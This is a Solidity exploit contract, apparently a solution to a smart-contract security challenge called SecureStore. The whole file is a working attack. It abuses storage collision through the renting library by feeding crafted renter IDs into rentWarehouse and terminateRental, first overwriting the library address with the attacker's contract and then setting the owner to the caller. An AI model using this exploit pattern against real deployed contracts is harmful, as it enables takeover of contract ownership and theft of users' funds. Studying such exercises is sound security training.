// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "forge-std/console.sol";

interface ISecureStore {
    function rentWarehouse(uint256 _numDays, uint256 _renterId) external;
    function terminateRental() external;
}

contract AttackSecureStore {
    address public rentingLibrary;
    address public owner;
    uint256 public pricePerDay;
    uint256 public rentedUntil;
    ISecureStore secureStore;

    IERC20 public usdc;

    using SafeERC20 for IERC20;

    constructor(address _usdc, address _secureStore) {
        usdc = IERC20(_usdc);
        secureStore = ISecureStore(_secureStore);
    }

    function attack() external {
        usdc.approve(address(secureStore), 100 ether);

        // Step 1: Overwrite rentingLibrary
        secureStore.rentWarehouse(1, uint256(uint160(address(this))));
        secureStore.terminateRental();

        // Step 2: Take ownership
        secureStore.rentWarehouse(1, uint256(uint160(msg.sender)));
        secureStore.terminateRental();

        usdc.transfer(msg.sender, 100 ether);
    }

    function setCurrentRenter(uint256 _renterId) public {
        owner = address(uint160(_renterId));
    }
}
